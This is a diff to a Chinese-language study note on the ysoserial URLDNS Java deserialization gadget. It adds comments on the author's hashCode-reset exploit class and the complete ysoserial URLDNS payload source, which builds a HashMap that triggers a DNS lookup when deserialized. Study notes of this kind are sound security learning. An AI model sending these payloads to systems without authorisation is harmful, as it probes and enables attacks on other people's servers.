@@ -5,6 +5,8 @@
 >   [SerializationDumper辅助研究ysoserial URLDNS反序列化原理](https://xz.aliyun.com/t/8686)
 >
 >   [Ysoserial URLDNS分析](https://y4er.com/post/ysoserial-urldns/)
+>
+>   https://www.anquanke.com/post/id/261724
 
 
 
@@ -287,7 +289,7 @@ u1s1P牛还是很人性化的，，说的太对了，网上一上来就各种cc�
 
 ![image-20220427172122865](README/image-20220427172122865.png)
 
-dns这个东西，懂吧不能查太多次，，，，
+dns这个东西，懂吧不能查太多次，，，，（所以有了下面先改hashcode为其他值，再改为-1）
 
 我们希望的是，在序列化的时候不进行查询，之后在反序列化的时候执行hashcode进行查询，so在序列化的时候，put时走的应该是直接return hashcode，而不是计算hashCode后返回，所以要先写个其他的值，put之后，再将其改为-1，exp如下：
 
@@ -316,7 +318,7 @@ public class urldnsexp {
         Field field = null;
         field = clazz.getDeclaredField("hashCode");
         field.setAccessible(true);
-        field.set(url1, 123123);
+        field.set(url1, 123123);//加这句是为了防止干扰，，dns查多了就不回显了
         obj.put(url1, "qwer");
         field.set(url1, -1);
 
@@ -335,4 +337,105 @@ public class urldnsexp {
 ```
 
 ![image-20220427234834643](README/image-20220427234834643.png)
+
+至于`ysoserial`里面为啥就能直接put？注意看他为了防止生成payload的 时候也进行dns查询，重写了一个`SilentURLStreamHandler`类，改写了`getHostAddress`，put一个url到hashMap中时，不会真正触发dns查询请求。
+
+```java
+package ysoserial.payloads;
+
+import java.io.IOException;
+import java.net.InetAddress;
+import java.net.URLConnection;
+import java.net.URLStreamHandler;
+import java.util.HashMap;
+import java.net.URL;
+
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
+import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
+
+/**
+ * A blog post with more details about this gadget chain is at the url below:
+ * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
+ * <p>
+ * This was inspired by Philippe Arteau @h3xstream, who wrote a blog
+ * posting describing how he modified the Java Commons Collections gadget
+ * in ysoserial to open a URL. This takes the same idea, but eliminates
+ * the dependency on Commons Collections and does a DNS lookup with just
+ * standard JDK classes.
+ * <p>
+ * The Java URL class has an interesting property on its equals and
+ * hashCode methods. The URL class will, as a side effect, do a DNS lookup
+ * during a comparison (either equals or hashCode).
+ * <p>
+ * As part of deserialization, HashMap calls hashCode on each key that it
+ * deserializes, so using a Java URL object as a serialized key allows
+ * it to trigger a DNS lookup.
+ * <p>
+ * Gadget Chain:
+ * HashMap.readObject()
+ * HashMap.putVal()
+ * HashMap.hash()
+ * URL.hashCode()
+ */
+@SuppressWarnings({ "rawtypes", "unchecked" })
+@PayloadTest(skip = "true")
+@Dependencies()
+@Authors({ Authors.GEBL })
+public class URLDNS implements ObjectPayload<Object> {
+
+    public Object getObject(final String url) throws Exception {
+
+        // Avoid DNS resolution during payload creation
+        // Since the field <code>java.net.URL.handler</code> is transient, it will not
+        // be part of the serialized payload.
+        URLStreamHandler handler = new SilentURLStreamHandler();
+
+        HashMap ht = new HashMap(); // HashMap that will contain the URL
+        URL u = new URL(null, url, handler); // URL to use as the Key
+        ht.put(u, url); // The value can be anything that is Serializable, URL as the key is what
+                        // triggers the DNS lookup.
+
+        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and
+                                                      // cached. This resets that so the next time hashCode is called a
+                                                      // DNS lookup will be triggered.
+
+        return ht;
+    }
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(URLDNS.class, args);
+    }
+
+    /**
+     * <p>
+     * This instance of URLStreamHandler is used to avoid any DNS resolution while
+     * creating the URL instance.
+     * DNS resolution is used for vulnerability detection. It is important not to
+     * probe the given URL prior
+     * using the serialized object.
+     * </p>
+     *
+     * <b>Potential false negative:</b>
+     * <p>
+     * If the DNS name is resolved first from the tester computer, the targeted
+     * server might get a cache hit on the
+     * second resolution.
+     * </p>
+     */
+    static class SilentURLStreamHandler extends URLStreamHandler {
+
+        protected URLConnection openConnection(URL u) throws IOException {
+            return null;
+        }
+
+        protected synchronized InetAddress getHostAddress(URL u) {
+            return null;
+        }
+    }
+}
+
+```
 
